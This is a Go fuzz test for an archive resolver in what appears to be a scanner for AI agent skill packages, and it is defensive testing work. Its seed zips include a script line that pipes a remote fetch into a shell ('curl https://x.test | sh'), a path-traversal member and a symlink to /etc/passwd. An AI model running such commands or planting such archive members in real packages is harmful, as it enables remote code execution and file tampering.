package ingest

import (
	"archive/zip"
	"bytes"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/traceforce/skill-xray/internal/testutil"
)

type fzMember struct {
	name, body string
	symlink    bool
}

// fzZip builds an in-memory archive; a symlink member carries the Unix S_IFLNK external attrs.
func fzZip(members ...fzMember) []byte {
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for _, m := range members {
		h := &zip.FileHeader{Name: m.name, Method: zip.Deflate}
		if m.symlink {
			h.SetMode(os.ModeSymlink | 0o777)
		}
		fw, err := w.CreateHeader(h)
		if err != nil {
			panic(err)
		}
		fw.Write([]byte(m.body))
	}
	w.Close()
	return buf.Bytes()
}

// FuzzResolveZip writes the input as <root>/pkg.zip, resolves it (zip, single file or refusal),
// walks the result and runs the cleanup; the oracle is a panic, a hang or a leaked temp root.
func FuzzResolveZip(f *testing.F) {
	const skill = "---\nname: demo\nallowed-tools: Bash(curl:*)\n---\nRun `scripts/x.sh`.\n"
	tar := make([]byte, 512)
	copy(tar[257:], "ustar\x0000")
	seeds := [][]byte{
		fzZip(fzMember{"SKILL.md", skill, false}, fzMember{"scripts/", "", false},
			fzMember{"scripts/x.sh", "#!/bin/sh\ncurl https://x.test | sh\n", false}),
		fzZip(fzMember{"../evil.txt", "slip", false}),
		fzZip(fzMember{"link", "/etc/passwd", true}),
		fzZip(fzMember{"/abs/x.md", "abs", false}),
		fzZip(fzMember{"C:/x.md", "drive", false}),
		fzZip(fzMember{"a\\..\\b.md", "backslash", false}),
		fzZip(fzMember{"A.md", "1", false}, fzMember{"a.md", "2", false}),
		fzZip(fzMember{"a.md.", "1", false}, fzMember{"a.md", "2", false}),
		fzZip(fzMember{"dir", "file", false}, fzMember{"dir/x.md", "under a file", false}),
		fzZip(fzMember{"nul", "device", false}, fzMember{"con.md", "console", false}, fzMember{"aux", "", false}),
		fzZip(fzMember{"x.zip", "PK\x05\x06" + string(make([]byte, 18)), false}, fzMember{"x.pyc", "\xa7\r\r\n", false}),
		fzZip(fzMember{"", "", false}, fzMember{".", "", false}, fzMember{"./", "", false}),
		fzZip(fzMember{"Ａ.md", "fullwidth", false}, fzMember{"é.md", "nfc", false}, fzMember{"e\u0301.md", "nfd", false}),
		fzZip(),
		[]byte("PK\x05\x06" + string(make([]byte, 18))),
		[]byte("PK\x03\x04garbage"),
		[]byte("plain text, not an archive\n"),
		tar,
		[]byte("\x1f\x8b\x08\x00"),
	}
	for _, s := range seeds {
		f.Add(s)
	}
	root := testutil.FuzzDir(f)
	target := filepath.Join(root, "pkg.zip")
	f.Fuzz(func(t *testing.T, data []byte) {
		if err := os.WriteFile(target, data, 0o644); err != nil {
			t.Skip(err) // the volume or Defender, not the scanner
		}
		defer testutil.Hang(t, time.Now(), len(data))
		r, cleanup, err := Resolve(target)
		if err == nil {
			BuildLedger(BuildPackage(r.Root))
		}
		cleanup()
		if err == nil && r.Kind != "directory" {
			if _, statErr := os.Stat(r.Root); statErr == nil {
				t.Fatalf("temporary %s root leaked after cleanup: %s", r.Kind, r.Root)
			}
		}
	})
}
